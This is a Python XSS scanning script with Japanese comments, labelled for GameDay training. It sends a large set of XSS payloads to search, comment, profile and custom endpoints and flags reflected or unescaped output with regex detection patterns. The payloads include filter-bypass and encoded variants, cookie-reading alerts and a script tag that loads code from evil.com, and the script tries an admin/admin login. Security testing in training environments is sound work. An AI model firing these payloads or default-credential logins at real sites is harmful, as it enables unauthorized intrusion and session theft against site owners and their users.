#!/usr/bin/env python3
"""
XSS（Cross-Site Scripting）脆弱性テストスクリプト
GameDay環境での学習目的のみに使用
"""

import requests
import argparse
import json
import logging
import time
from datetime import datetime
from typing import List, Dict, Any, Optional
import urllib.parse
import sys
import os
import re

# ログ設定
def setup_logging(log_level: str = "INFO") -> logging.Logger:
    """ログ設定を初期化"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{log_dir}/xss_test_{timestamp}.log"
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"ログファイル: {log_file}")
    return logger

class XSSTester:
    """XSS脆弱性テスター"""
    
    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url.rstrip('/')
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GameDay-XSS-Tester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # XSSペイロード
        self.payloads = {
            'basic_script': [
                '<script>alert("XSS")</script>',
                '<script>alert(1)</script>',
                '<script>alert(document.domain)</script>',
                '<script>alert(document.cookie)</script>',
                '<script>console.log("XSS")</script>',
                '<script src="http://evil.com/xss.js"></script>'
            ],
            'event_handlers': [
                '<img src=x onerror=alert("XSS")>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(1)">',
                '<audio src=x onerror=alert("XSS")>',
                '<details open ontoggle=alert("XSS")>'
            ],
            'html_injection': [
                '<h1>XSS Test</h1>',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<embed src="javascript:alert(1)">',
                '<object data="javascript:alert(1)">',
                '<applet code="javascript:alert(1)">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
                '<link rel="stylesheet" href="javascript:alert(1)">',
                '<style>@import"javascript:alert(1)";</style>'
            ],
            'javascript_injection': [
                'javascript:alert("XSS")',
                'javascript:alert(1)',
                'javascript:alert(document.domain)',
                'javascript:console.log("XSS")',
                'vbscript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert`XSS`</script>',
                '<script>eval("alert(\\"XSS\\")")</script>',
                '<script>setTimeout("alert(\\"XSS\\")",1)</script>',
                '<script>setInterval("alert(\\"XSS\\")",1000)</script>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '</script><script>alert("XSS")</script>',
                '<script>/**/alert("XSS")/**/<//script>',
                '<script>alert("XSS")//</script>',
                '<script>alert("XSS");</script><!--'
            ],
            'attribute_injection': [
                '" onmouseover="alert(\\"XSS\\")"',
                "' onmouseover='alert(\"XSS\")'",
                '" onfocus="alert(\\"XSS\\")" autofocus="',
                "' onfocus='alert(\"XSS\")' autofocus='",
                '" onclick="alert(\\"XSS\\")"',
                "' onclick='alert(\"XSS\")'",
                '" onload="alert(\\"XSS\\")"',
                "' onload='alert(\"XSS\")'",
                '" style="background:url(javascript:alert(\\"XSS\\"))"',
                "' style='background:url(javascript:alert(\"XSS\"))'"
            ],
            'encoded_payloads': [
                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
                '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
                '&#x3C;script&#x3E;alert(&#x22;XSS&#x22;)&#x3C;/script&#x3E;',
                '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
                '\\x3Cscript\\x3Ealert(\\x22XSS\\x22)\\x3C/script\\x3E'
            ]
        }
        
        # XSS検出パターン
        self.detection_patterns = [
            r'<script[^>]*>.*?alert\s*\([^)]*\).*?</script>',
            r'<script[^>]*>.*?console\.log\s*\([^)]*\).*?</script>',
            r'<img[^>]*onerror\s*=\s*["\']?alert\s*\([^)]*\)',
            r'<[^>]*on\w+\s*=\s*["\']?alert\s*\([^)]*\)',
            r'javascript:\s*alert\s*\([^)]*\)',
            r'<iframe[^>]*src\s*=\s*["\']?javascript:',
            r'<object[^>]*data\s*=\s*["\']?javascript:',
            r'<embed[^>]*src\s*=\s*["\']?javascript:',
            r'<h1>XSS Test</h1>',
            r'<style>@import"javascript:',
            r'<meta[^>]*http-equiv\s*=\s*["\']?refresh[^>]*javascript:'
        ]
    
    def test_search_form(self, endpoint: str = "/search") -> List[Dict[str, Any]]:
        """検索フォームのXSSテスト"""
        self.logger.info(f"検索フォームのXSSテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for category, payloads in self.payloads.items():
            self.logger.info(f"カテゴリ '{category}' のテスト実行中...")
            
            for payload in payloads:
                # GETパラメータとしてテスト
                result = self._test_single_payload(
                    url,
                    {'q': payload, 'search': payload, 'query': payload},
                    method='GET',
                    payload_type=category,
                    payload=payload,
                    injection_point='search_parameter'
                )
                results.append(result)
                
                # POSTデータとしてテスト
                result = self._test_single_payload(
                    url,
                    {'q': payload, 'search': payload, 'query': payload},
                    method='POST',
                    payload_type=category,
                    payload=payload,
                    injection_point='search_form'
                )
                results.append(result)
                
                time.sleep(0.3)
        
        return results
    
    def test_comment_form(self, endpoint: str = "/comment") -> List[Dict[str, Any]]:
        """コメントフォームのXSSテスト"""
        self.logger.info(f"コメントフォームのXSSテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for category, payloads in self.payloads.items():
            self.logger.info(f"カテゴリ '{category}' のテスト実行中...")
            
            for payload in payloads:
                # コメント内容としてテスト
                result = self._test_single_payload(
                    url,
                    {
                        'comment': payload,
                        'message': payload,
                        'content': payload,
                        'text': payload,
                        'name': 'Test User',
                        'email': 'test@example.com'
                    },
                    method='POST',
                    payload_type=category,
                    payload=payload,
                    injection_point='comment_content'
                )
                results.append(result)
                
                # 名前フィールドとしてテスト
                result = self._test_single_payload(
                    url,
                    {
                        'comment': 'Test comment',
                        'message': 'Test message',
                        'name': payload,
                        'username': payload,
                        'email': 'test@example.com'
                    },
                    method='POST',
                    payload_type=category,
                    payload=payload,
                    injection_point='name_field'
                )
                results.append(result)
                
                time.sleep(0.3)
        
        return results
    
    def test_profile_form(self, endpoint: str = "/profile") -> List[Dict[str, Any]]:
        """プロフィールフォームのXSSテスト"""
        self.logger.info(f"プロフィールフォームのXSSテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        # まずログインが必要かもしれないので、セッションを確立
        self._attempt_login()
        
        for category, payloads in self.payloads.items():
            self.logger.info(f"カテゴリ '{category}' のテスト実行中...")
            
            for payload in payloads:
                # 各プロフィールフィールドをテスト
                profile_fields = {
                    'name': payload,
                    'username': 'testuser',
                    'email': 'test@example.com',
                    'bio': payload,
                    'description': payload,
                    'website': payload,
                    'location': payload
                }
                
                result = self._test_single_payload(
                    url,
                    profile_fields,
                    method='POST',
                    payload_type=category,
                    payload=payload,
                    injection_point='profile_fields'
                )
                results.append(result)
                
                time.sleep(0.3)
        
        return results
    
    def test_custom_endpoint(self, endpoint: str, parameters: Dict[str, str], method: str = 'GET') -> List[Dict[str, Any]]:
        """カスタムエンドポイントのXSSテスト"""
        self.logger.info(f"カスタムエンドポイント '{endpoint}' のXSSテスト開始")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for param_name in parameters.keys():
            self.logger.info(f"パラメータ '{param_name}' のテスト中...")
            
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    result = self._test_single_payload(
                        url,
                        test_params,
                        method=method,
                        payload_type=category,
                        payload=payload,
                        injection_point=param_name
                    )
                    results.append(result)
                    
                    time.sleep(0.3)
        
        return results
    
    def _attempt_login(self):
        """簡単なログイン試行（テスト用）"""
        try:
            login_url = f"{self.base_url}/login"
            login_data = {
                'username': 'admin',
                'password': 'admin'
            }
            self.session.post(login_url, data=login_data, timeout=5)
        except:
            pass  # ログインに失敗しても続行
    
    def _test_single_payload(self, url: str, data: Dict[str, str], method: str = 'GET',
                           payload_type: str = '', payload: str = '', injection_point: str = '') -> Dict[str, Any]:
        """単一ペイロードのテスト実行"""
        start_time = time.time()
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=data, timeout=10)
            else:
                response = self.session.post(url, data=data, timeout=10)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # XSS脆弱性の検出
            vulnerability_detected = self._analyze_response(response, payload)
            
            result = {
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'payload': payload,
                'injection_point': injection_point,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'vulnerability_detected': vulnerability_detected['detected'],
                'vulnerability_evidence': vulnerability_detected['evidence'],
                'reflection_detected': vulnerability_detected['reflection'],
                'timestamp': datetime.now().isoformat()
            }
            
            if vulnerability_detected['detected']:
                self.logger.warning(f"XSS脆弱性検出: {payload_type} - {injection_point}")
                self.logger.warning(f"ペイロード: {payload}")
                self.logger.warning(f"証拠: {vulnerability_detected['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            self.logger.error(f"リクエスト失敗: {str(e)}")
            
            return {
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'payload': payload,
                'injection_point': injection_point,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'vulnerability_detected': False,
                'vulnerability_evidence': f'Request failed: {str(e)}',
                'reflection_detected': False,
                'timestamp': datetime.now().isoformat()
            }
    
    def _analyze_response(self, response: requests.Response, payload: str) -> Dict[str, Any]:
        """レスポンスのXSS脆弱性分析"""
        response_text = response.text
        
        # ペイロードがそのまま反映されているかチェック
        payload_reflected = payload in response_text
        
        # XSSパターンの検出
        for pattern in self.detection_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return {
                    'detected': True,
                    'evidence': f'XSSパターン検出: {pattern}',
                    'reflection': payload_reflected
                }
        
        # HTMLエンティティエンコードされていないスクリプトタグの検出
        if '<script>' in response_text.lower() and 'alert(' in response_text.lower():
            return {
                'detected': True,
                'evidence': 'エンコードされていないスクリプトタグ検出',
                'reflection': payload_reflected
            }
        
        # イベントハンドラーの検出
        event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus']
        for handler in event_handlers:
            if f'{handler}=' in response_text.lower() and 'alert(' in response_text.lower():
                return {
                    'detected': True,
                    'evidence': f'危険なイベントハンドラー検出: {handler}',
                    'reflection': payload_reflected
                }
        
        # JavaScriptプロトコルの検出
        if 'javascript:' in response_text.lower() and 'alert(' in response_text.lower():
            return {
                'detected': True,
                'evidence': 'JavaScriptプロトコル検出',
                'reflection': payload_reflected
            }
        
        # HTMLインジェクションの検出（基本的なタグ）
        html_tags = ['<h1>', '<iframe>', '<object>', '<embed>', '<applet>']
        for tag in html_tags:
            if tag.lower() in response_text.lower():
                return {
                    'detected': True,
                    'evidence': f'HTMLインジェクション検出: {tag}',
                    'reflection': payload_reflected
                }
        
        # ペイロードが反映されているが、適切にエスケープされていない場合
        if payload_reflected:
            # 基本的なHTMLエスケープがされているかチェック
            escaped_payload = (payload.replace('<', '&lt;')
                             .replace('>', '&gt;')
                             .replace('"', '&quot;')
                             .replace("'", '&#x27;'))
            
            if escaped_payload not in response_text:
                return {
                    'detected': True,
                    'evidence': 'ペイロードが適切にエスケープされていない',
                    'reflection': True
                }
        
        return {
            'detected': False,
            'evidence': '',
            'reflection': payload_reflected
        }
    
    def generate_report(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """テスト結果のレポート生成"""
        total_tests = len(results)
        vulnerabilities_found = [r for r in results if r['vulnerability_detected']]
        reflections_found = [r for r in results if r['reflection_detected']]
        
        vulnerability_by_injection_point = {}
        for vuln in vulnerabilities_found:
            point = vuln['injection_point']
            vulnerability_by_injection_point[point] = vulnerability_by_injection_point.get(point, 0) + 1
        
        payload_effectiveness = {}
        for result in results:
            payload_type = result['payload_type']
            if payload_type not in payload_effectiveness:
                payload_effectiveness[payload_type] = {'total': 0, 'successful': 0}
            
            payload_effectiveness[payload_type]['total'] += 1
            if result['vulnerability_detected']:
                payload_effectiveness[payload_type]['successful'] += 1
        
        # 成功率の計算
        for payload_type in payload_effectiveness:
            total = payload_effectiveness[payload_type]['total']
            successful = payload_effectiveness[payload_type]['successful']
            payload_effectiveness[payload_type]['success_rate'] = (successful / total * 100) if total > 0 else 0
        
        report = {
            'target_url': self.base_url,
            'test_summary': {
                'total_tests': total_tests,
                'vulnerabilities_found': len(vulnerabilities_found),
                'vulnerability_rate': (len(vulnerabilities_found) / total_tests * 100) if total_tests > 0 else 0,
                'reflections_found': len(reflections_found),
                'reflection_rate': (len(reflections_found) / total_tests * 100) if total_tests > 0 else 0
            },
            'vulnerability_by_injection_point': vulnerability_by_injection_point,
            'payload_effectiveness': payload_effectiveness,
            'high_risk_findings': [
                vuln for vuln in vulnerabilities_found 
                if any(keyword in vuln['vulnerability_evidence'].lower() 
                      for keyword in ['script', 'javascript', 'onerror', 'onload'])
            ],
            'test_timestamp': datetime.now().isoformat(),
            'detailed_results': results
        }
        
        return report

def main():
    """メイン関数"""
    parser = argparse.ArgumentParser(description='XSS脆弱性テスト')
    parser.add_argument('-u', '--url', required=True, help='ターゲットベースURL')
    parser.add_argument('-e', '--endpoint', help='テスト対象エンドポイント')
    parser.add_argument('-t', '--test-type', choices=['search', 'comment', 'profile', 'custom'], 
                       default='search', help='テストタイプ')
    parser.add_argument('-p', '--parameters', help='カスタムパラメータ（JSON形式）')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', 
                       help='HTTPメソッド（カスタムテスト用）')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='ログレベル')
    parser.add_argument('--output', help='結果出力ファイル（JSON形式）')
    
    args = parser.parse_args()
    
    # ログ設定
    logger = setup_logging(args.log_level)
    
    # テスター初期化
    tester = XSSTester(args.url, logger)
    
    # テスト実行
    try:
        if args.test_type == 'search':
            endpoint = args.endpoint or '/search'
            results = tester.test_search_form(endpoint)
        elif args.test_type == 'comment':
            endpoint = args.endpoint or '/comment'
            results = tester.test_comment_form(endpoint)
        elif args.test_type == 'profile':
            endpoint = args.endpoint or '/profile'
            results = tester.test_profile_form(endpoint)
        elif args.test_type == 'custom':
            if not args.endpoint:
                logger.error("カスタムテストにはエンドポイントの指定が必要です")
                return 1
            
            parameters = {}
            if args.parameters:
                try:
                    parameters = json.loads(args.parameters)
                except json.JSONDecodeError:
                    logger.error("パラメータのJSON形式が無効です")
                    return 1
            
            results = tester.test_custom_endpoint(args.endpoint, parameters, args.method)
        
        # レポート生成
        report = tester.generate_report(results)
        
        # 結果表示
        logger.info("=== XSS脆弱性テスト結果 ===")
        logger.info(f"総テスト数: {report['test_summary']['total_tests']}")
        logger.info(f"脆弱性検出数: {report['test_summary']['vulnerabilities_found']}")
        logger.info(f"脆弱性検出率: {report['test_summary']['vulnerability_rate']:.2f}%")
        logger.info(f"反映検出数: {report['test_summary']['reflections_found']}")
        logger.info(f"反映検出率: {report['test_summary']['reflection_rate']:.2f}%")
        
        if report['vulnerability_by_injection_point']:
            logger.info("インジェクションポイント別脆弱性:")
            for point, count in report['vulnerability_by_injection_point'].items():
                logger.info(f"  {point}: {count}件")
        
        if report['high_risk_findings']:
            logger.warning(f"高リスクな脆弱性: {len(report['high_risk_findings'])}件")
        
        # 結果をファイルに保存
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            logger.info(f"結果をファイルに保存: {args.output}")
    
    except Exception as e:
        logger.error(f"テスト実行中にエラーが発生: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())